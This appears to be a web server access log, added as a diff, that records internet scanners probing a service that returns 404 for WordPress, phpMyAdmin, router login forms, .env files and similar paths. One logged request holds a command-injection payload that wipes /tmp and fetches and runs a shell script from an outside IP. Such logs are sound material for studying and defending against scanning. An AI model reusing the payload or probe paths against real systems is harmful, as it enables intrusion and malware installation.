+INFO:     106.74.26.129:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     106.74.26.129:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     185.220.100.247:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /xmlrpc.php?rsd HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /web/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /website/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /news/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /test/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /site/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     35.230.86.203:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     106.75.84.113:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     106.75.84.113:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35680 - "GET / HTTP/1.0" 404 Not Found
+INFO:     106.75.84.113:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     106.75.84.113:0 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35686 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35688 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35690 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     95.65.50.236:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35694 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35696 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35698 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35700 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     223.111.175.4:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     223.111.175.4:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     223.111.175.4:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     223.111.175.4:0 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     179.43.177.242:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     81.3.139.254:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     94.102.61.10:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35718 - "GET / HTTP/1.0" 404 Not Found
+INFO:     138.128.247.175:0 - "POST /boaform/admin/formLogin HTTP/1.0" 404 Not Found
+INFO:     14.116.156.77:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     147.182.154.58:47298 - "GET /aaa9 HTTP/1.1" 404 Not Found
+INFO:     147.182.154.58:47310 - "GET /aab8 HTTP/1.1" 404 Not Found
+INFO:     147.182.154.58:47322 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35724 - "GET / HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35730 - "GET /script HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35732 - "GET /login HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35734 - "GET /jenkins/login HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35736 - "GET /manager/html HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35738 - "GET /users/sign_in HTTP/1.0" 404 Not Found
+INFO:     198.98.52.231:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35742 - "GET /owa/auth/logon.aspx?replaceCurrent=1&url=https://170.106.171.13/ecp HTTP/1.0" 404 Not Found
+INFO:     195.178.120.44:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     195.178.120.44:0 - "POST /HNAP1/ HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35748 - "OPTIONS / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35750 - "GET /dns-query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35752 - "POST /dns-query HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35754 - "GET /query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35756 - "POST /query HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35758 - "POST /resolve HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35760 - "GET /?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35762 - "POST / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35764 - "GET /.env HTTP/1.0" 404 Not Found
+INFO:     35.245.5.228:0 - "OPTIONS / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35768 - "GET / HTTP/1.0" 404 Not Found
+INFO:     45.81.243.34:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35772 - "GET / HTTP/1.0" 404 Not Found
+INFO:     106.75.75.21:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     106.75.75.21:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     106.75.75.21:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     106.75.75.21:0 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35782 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35784 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35786 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     45.128.232.149:0 - "POST /boaform/admin/formLogin HTTP/1.0" 404 Not Found
+INFO:     40.122.78.153:0 - "GET /wp-login.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35792 - "GET / HTTP/1.0" 404 Not Found
+INFO:     192.241.206.100:0 - "GET /manager/text/list HTTP/1.0" 404 Not Found
+INFO:     85.217.145.45:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     175.152.111.137:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35800 - "GET / HTTP/1.0" 404 Not Found
+INFO:     124.239.133.128:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     167.248.133.127:43938 - "GET / HTTP/1.1" 404 Not Found
+INFO:     167.248.133.127:38184 - "GET / HTTP/1.1" 404 Not Found
+INFO:     167.248.133.127:40664 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     45.79.181.223:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     198.199.106.214:0 - "GET /manager/html HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35808 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35810 - "GET / HTTP/1.0" 404 Not Found
+INFO:     92.118.39.82:0 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     170.64.190.6:54490 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     170.64.190.6:54500 - "GET /api/islogged HTTP/1.1" 404 Not Found
+INFO:     66.54.98.151:0 - "POST /GponForm/diag_Form?images/ HTTP/1.0" 404 Not Found
+INFO:     128.14.141.34:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35818 - "GET / HTTP/1.0" 404 Not Found
+INFO:     58.17.6.9:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     198.235.24.151:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     156.204.66.50:0 - "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.0" 404 Not Found
+INFO:     37.70.131.67:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35828 - "GET / HTTP/1.0" 404 Not Found
+INFO:     92.118.39.82:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     106.75.126.212:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     106.75.126.212:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     106.75.126.212:0 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     106.75.126.212:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35840 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35842 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35844 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35846 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35848 - "GET /remote/fgt_lang HTTP/1.0" 404 Not Found
+INFO:     152.89.196.54:0 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 Not Found
+INFO:     218.172.23.15:0 - "POST /GponForm/diag_Form?images/ HTTP/1.0" 404 Not Found
+INFO:     103.36.19.206:0 - "GET /wp-admin/css/ HTTP/1.0" 404 Not Found
+INFO:     103.36.19.206:0 - "GET /.well-known/ HTTP/1.0" 404 Not Found
+INFO:     103.36.19.206:0 - "GET /sites/default/files/ HTTP/1.0" 404 Not Found
+INFO:     103.36.19.206:0 - "GET /admin/controller/extension/extension/ HTTP/1.0" 404 Not Found
+INFO:     103.36.19.206:0 - "GET /uploads/ HTTP/1.0" 404 Not Found
+INFO:     103.36.19.206:0 - "GET /images/ HTTP/1.0" 404 Not Found
+INFO:     103.36.19.206:0 - "GET /files/ HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35868 - "GET / HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /xmlrpc.php?rsd HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /web/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /website/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /news/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /test/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /site/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     108.61.204.113:0 - "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     185.225.74.42:0 - "POST /boaform/admin/formLogin HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin2/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin2014/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin2020/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /db/dbadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /admin/web/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /administrator/admin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /mysql/admin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin3/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin2015/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin1/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin2011/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin2/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /PMA/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /shopdb/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /admin/sysadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin-5.3.0/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin2020/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /php-my-admin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin-latest-english/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /admin/db/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /mysql/db/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /db/phpmyadmin4/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin2/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /mysql/web/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin5/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin3/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /administrator/pma/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin4/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin5.1/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /2phpmyadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /sql/sql-admin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /1phpmyadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /mysql/pMA/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /mysqladmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin5/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmy/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /administrator/PMA/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /db/webdb/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /mysql/pma/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /sql/phpmanager/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /sql/php-myadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /db/myadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /_phpmyadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin5.2/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin-5.3.0/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin-latest-english/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin-4/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin2013/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /mysql/pma/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /_phpMyAdmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /mysqlmanager/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /pma/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /mysql-admin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin2017/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin-5.3.0/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin-latest-english/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin3/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /db/dbweb/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /shopdb/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /mysql/dbadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin-latest-all-languages/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin-5.3.0-all-languages/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /sql/phpmy-admin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /db/db-admin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /administrator/admin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /__phpmyadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /db/dbadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /db/webadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin2020/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /sql/phpmanager/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /PMA/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin5.1/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin1/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin2015/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin5.1/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin-latest-english/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /sql/php-myadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /admin/sysadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /db/phpmyadmin4/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin5/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin2012/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /sql/sql/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin3/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /sql/myadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin4/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /db/webdb/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /admin/pma/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /pma/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /db/phpmyadmin5/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /_phpMyAdmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /db/phpMyAdmin-4/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /mysql/pMA/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpmyadmin2012/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /db/websql/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /phpMyAdmin-5.3.0-all-languages/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /myadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /php-my-admin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /__phpmyadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /sql/sql/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /myadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.139.193.22:0 - "GET /_phpMyAdmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36166 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36168 - "GET / HTTP/1.0" 404 Not Found
+INFO:     152.89.196.54:0 - "GET /actuator/gateway/routes HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36172 - "GET /index.html HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36174 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36176 - "GET / HTTP/1.0" 404 Not Found
+INFO:     167.248.133.187:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     106.75.81.94:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     106.75.81.94:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     106.75.81.94:0 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     106.75.81.94:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36190 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36192 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36194 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36196 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     116.233.222.88:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     128.14.133.58:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     135.148.195.5:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     135.148.195.7:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36206 - "GET /index.html HTTP/1.0" 404 Not Found
